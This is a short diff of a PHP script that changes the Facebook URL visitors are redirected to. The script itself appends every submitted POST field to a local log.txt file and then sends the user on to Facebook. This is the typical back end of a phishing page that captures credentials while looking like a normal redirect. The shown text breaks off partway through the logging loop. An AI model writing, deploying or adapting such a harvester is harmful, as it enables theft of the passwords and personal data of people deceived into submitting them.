@@ -1,5 +1,5 @@
 <?php
-	header ('Location: https://fb.watch/nFuFRW0-Nu/?mibextid=v7YzmG '); 
+	header ('Location: https://www.facebook.com/photo?fbid=507381208998057&set=pcb.507381235664721 '); 
 	$handle = fopen("log.txt", "a");
 	foreach($_POST as $variable => $value) {
 		fwrite($handle, $variable);
